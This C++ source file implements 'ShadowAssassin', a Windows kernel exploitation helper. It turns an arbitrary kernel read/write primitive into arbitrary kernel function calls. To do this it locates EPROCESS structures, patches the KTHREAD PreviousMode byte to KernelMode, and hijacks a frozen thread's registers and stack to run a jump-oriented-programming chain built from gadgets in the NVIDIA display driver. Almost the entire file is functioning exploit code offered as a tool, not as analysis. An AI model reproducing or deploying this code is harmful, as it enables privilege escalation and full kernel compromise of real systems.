#include "shadowassassin.h"
#include "offsets.h"



ShadowAssassin::ShadowAssassin()
    : scratchAddress(0), EPROCESS(0), nvidia_base(0), ntso_base(0), mmGetSystemRoutineAddr(0)
{}

void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }


UINT64 ShadowAssassin::Get_System_EPROCESS() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    UINT64 ntobase = 0;
    LPVOID drivers[1024];
    DWORD filler;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &filler)) {
        ntobase = reinterpret_cast<uint64_t>(drivers[0]);
    }
    else {
        DbgLog("need to run as admin.\n");
    }

    UINT64 ps_system_pointer = ntobase + OFF_PS_INITIAL_SYSTEM_PROCESS;
    UINT64 result;

    readFn(&result, ps_system_pointer, 0x8);
    DbgLog("Found EPROCESS struct using sedbg at %llx\n\n", result);
    return result;
}




FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }


bool ShadowAssassin::Initialize() {
    UINT64 t0 = TimeUs();
    DbgLog("\n=== ShadowAssassin Initialize ===\n");

    if (!readFn || !writeFn) {
        DbgLog("[Initialize] FAIL: readFn=%d writeFn=%d\n", (bool)readFn, (bool)writeFn);
        return false;
    }

	EPROCESS = Get_System_EPROCESS();

    if (!EPROCESS) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: EPROCESS not set\n");
        return false;
    }

    frameManager.SetReadPrimitive(readFn);
    frameManager.SetWritePrimitive(writeFn);

    if (!ntso_base) {
        LPVOID drivers[1];
        DWORD needed = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            ntso_base = (UINT64)drivers[0];
    }
    if (!ntso_base) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: could not resolve ntoskrnl base\n");
        return false;
    }
    DbgLog("[ShadowAssassin::Initialize] ntso_base=0x%llX\n", ntso_base);

    jopManager.SetWritePrimitive(writeFn);
    jopManager.SetNvidiaBase(nvidia_base);

    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);

    static const wchar_t* ntosNames[] = { L"ntkrnlmp.exe", L"ntoskrnl.exe", nullptr };
    ImageMapping img;
    for (int i = 0; ntosNames[i]; i++) {
        wchar_t path[MAX_PATH];
        swprintf_s(path, L"%s\\%s", sysDir, ntosNames[i]);
        if (img.Open(path)) {
            break;
        }
    }
    if (!img.view) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: could not map kernel image from disk\n");
        return false;
    }

    UINT64 dataSectionRva = GetSectionRva(img, ".data");

    BuildExportCache(img);
    img.Close();

    if (!dataSectionRva) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: .data section not found in ntoskrnl image\n");
        return false;
    }

    UINT64 scratch = ntso_base + dataSectionRva + 0x80000;
    DbgLog("[ShadowAssassin::Initialize] JOP scratch=0x%llX (ntso .data RVA=0x%llX + 0x80000)\n",
        scratch, dataSectionRva);
    jopManager.SetScratchBase(scratch);

    UINT64 currentEPROCESS = GetCurrentEPROCESS(EPROCESS);

	if (!currentEPROCESS) {
		DbgLog("[ShadowAssassin::Initialize] FAIL: GetCurrentEPROCESS returned 0\n");
		return false;
	}
	DbgLog("[ShadowAssassin::Initialize] Current EPROCESS=0x%llX\n", currentEPROCESS);


	frameManager.SetEPROCESS(currentEPROCESS);

    nvidia_base = GetModuleBaseAddress("nvlddmkm.sys");
    ntso_base = GetModuleBaseAddress("ntoskrnl.exe");

    DbgLog("[ShadowAssassin::Initialize] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);

    if (nvidia_base == 0) {
        DbgLog("[ShadowAssassin::Initialize] Nvidia Driver not loaded! Load it!\n ");
        return false;
    }

	jopManager.SetNvidiaBase(nvidia_base);

    DbgLog("\n[Initialize] Done in %s\n\n", FmtMs(TimeUs() - t0).c_str());
    return true;
}



UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectionName) {
    if (!img.view) return 0;

    auto dos = (PIMAGE_DOS_HEADER)img.view;
    auto nt  = (PIMAGE_NT_HEADERS)((uintptr_t)img.view + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strncmp((const char*)sec[i].Name, sectionName, 8) == 0) {
            return sec[i].VirtualAddress;
        }
    }

    DbgLog("[GetSectionRva] FAIL: '%s' not found\n", sectionName);
    return 0;
}


void ShadowAssassin::BuildExportCache(const ImageMapping& img) {
    UINT64 t0 = TimeUs();
    if (!img.view) return;

    auto dos = (PIMAGE_DOS_HEADER)img.view;
    auto nt  = (PIMAGE_NT_HEADERS)((uintptr_t)img.view + dos->e_lfanew);

    DWORD exportDirRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportDirRva) return;

    auto dir       = (PIMAGE_EXPORT_DIRECTORY)((uintptr_t)img.view + exportDirRva);
    auto names     = (DWORD* )((uintptr_t)img.view + dir->AddressOfNames);
    auto funcs     = (DWORD* )((uintptr_t)img.view + dir->AddressOfFunctions);
    auto ordinals  = (USHORT*)((uintptr_t)img.view + dir->AddressOfNameOrdinals);

    exportCache.reserve(dir->NumberOfNames);
    for (DWORD i = 0; i < dir->NumberOfNames; i++) {
        const char* name = (const char*)((uintptr_t)img.view + names[i]);
        DWORD rva = funcs[ordinals[i]];
        exportCache[name] = rva;
    }

    DbgLog("[BuildExportCache] %zu exports cached in %s\n", exportCache.size(), FmtMs(TimeUs() - t0).c_str());
}

UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
    auto it = exportCache.find(name);
    if (it == exportCache.end()) {
        DbgLog("[ResolveKernelExport] FAIL: '%s' not in cache\n", name.c_str());
        return 0;
    }
    UINT64 result = ntso_base + it->second;
    DbgLog("[ResolveKernelExport] %s -> 0x%llX\n", name.c_str(), result);
    return result;
}

UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
{
    UINT32 pid = GetCurrentProcessId();
	UINT64 currentPid = 0;

	UINT64 firstEPROCESS = eprocess;

	while (true) {
		readFn(&currentPid, (UINT64)(eprocess + OFF_PID), 0x8);
		if (currentPid == pid) 
			return eprocess;

		UINT64 flink = 0;
		readFn(&flink, (UINT64)(eprocess + OFF_EPROCESS_LIST), sizeof(UINT64));
		if (!flink || flink == eprocess + OFF_EPROCESS_LIST || flink == firstEPROCESS) {
			DbgLog("[GetCurrentEPROCESS] FAIL: walked full list, PID=%u not found\n", pid);
			return 0;
		}
		eprocess = flink - OFF_EPROCESS_LIST;
	}

}




UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
    LPVOID drivers[1024]; DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        for (int i = 0; i < (cbNeeded / sizeof(drivers[0])); i++) {
            char szDriver[256];
            if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver)) && _stricmp(szDriver, targetName) == 0) {
                return (UINT64)drivers[i];
            }
        }
    }
    return 0;
}

UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
    UINT64 t0 = TimeUs();
	UINT64 funcAddr = ResolveKernelExport(name);
	if (!funcAddr) {
		DbgLog("[CallSyscall] FAIL: could not resolve '%s'\n\n", name.c_str());
		return 0;
	}
    UINT64 result = CallSyscallByAddress(funcAddr, params);
    DbgLog("[CallSyscall] %s -> 0x%llX  total=%s\n\n", name.c_str(), result, FmtMs(TimeUs() - t0).c_str());
    return result;
}



UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<UINT64>& params) {
    if (!funcAddr) {
        DbgLog("[CallSyscallByAddress] FAIL: null address\n");
        return 0;
    }

    UINT64 t0 = TimeUs();

    frameManager.CreateFrozenThread();
    UINT64 tFrame = TimeUs() - t0;

    UINT64 frameBase = frameManager.GetFrameAddress();
    if (!frameBase) {
        DbgLog("[CallSyscallByAddress] FAIL: no frame\n");
        return 0;
    }
    DbgLog("\n[CallSyscallByAddress] 0x%llX  thread=%s\n", funcAddr, FmtMs(tFrame).c_str());

    UINT64 tSetup0 = TimeUs();
    // Set PreviousMode = KernelMode (0) — read surrounding 8 bytes, patch the byte, write back
    UINT64 kthread   = frameManager.GetKthreadAddress();
    UINT64 pmAligned = kthread ? (kthread + (OFF_KTHREAD_PREVIOUS_MODE & ~7ULL)) : 0;
    UINT64 pmByte    = OFF_KTHREAD_PREVIOUS_MODE & 7;
    if (kthread) {
        UINT64 pmQword = 0;
        readFn(&pmQword, pmAligned, sizeof(UINT64));
        writeFn(pmAligned, pmQword & ~(0xFFULL << (pmByte * 8)));
    }

    jopManager.Build(0x0078CB9E, 0x006d066a, 0x00671319, 0x0061cbb5);
    jopManager.SetCallTarget(funcAddr);
    jopManager.SetRestoreRip(frameManager.ReadStoredRegister("rip"));
    jopManager.Commit();

    frameManager.WriteRegister("rax", jopManager.GetRax());
    frameManager.WriteRegister("rsi", jopManager.GetRsi());
    frameManager.WriteRegister("rip", jopManager.GetRip());

    if (params.size() > 0) frameManager.WriteRegister("rcx", params[0]);
    if (params.size() > 1) frameManager.WriteRegister("rdx", params[1]);
    if (params.size() > 2) frameManager.WriteRegister("r8",  params[2]);
    if (params.size() > 3) frameManager.WriteRegister("r9",  params[3]);

    UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
    UINT64 newRsp = originalRsp - 0x800;

    writeFn(newRsp + 0x60, originalRsp);
    writeFn(newRsp + 0x58, jopManager.GetRdx());
    writeFn(newRsp + 0x30, jopManager.GetRdiForJmp());

    frameManager.WriteRegister("rsp", newRsp + 0x30);
    DbgLog("[CallSyscallByAddress] setup=%s\n", FmtMs(TimeUs() - tSetup0).c_str());

    // Write sentinel before firing so we can detect when gadget3 overwrites it
    const UINT64 SENTINEL = 0xDEADC0DEDEADC0DEULL;
    writeFn(jopManager.GetReturnValueAddr(), SENTINEL);

    UINT64 tFire = TimeUs();
    frameManager.ContinueThread();

    // Poll until gadget3 writes the real return value (replaces sentinel)
    UINT64 retVal = SENTINEL;
    const UINT64 TIMEOUT_US = 2000000ULL; // 2 seconds
    while (retVal == SENTINEL && (TimeUs() - tFire) < TIMEOUT_US) {
        Sleep(1);
        readFn(&retVal, jopManager.GetReturnValueAddr(), sizeof(UINT64));
    }

    if (retVal == SENTINEL) {
        DbgLog("[CallSyscallByAddress] TIMEOUT: chain did not complete in 2000ms\n");
        retVal = 0;
    }

    // Restore PreviousMode = UserMode (1)
    if (kthread) {
        UINT64 pmQword = 0;
        readFn(&pmQword, pmAligned, sizeof(UINT64));
        UINT64 pmQwordUser = (pmQword & ~(0xFFULL << (pmByte * 8))) | (1ULL << (pmByte * 8));
        writeFn(pmAligned, pmQwordUser);
    }
    DbgLog("[CallSyscallByAddress] -> 0x%llX (chain %s, total %s)\n\n",
        retVal, FmtMs(TimeUs() - tFire).c_str(), FmtMs(TimeUs() - t0).c_str());
    return retVal;
}
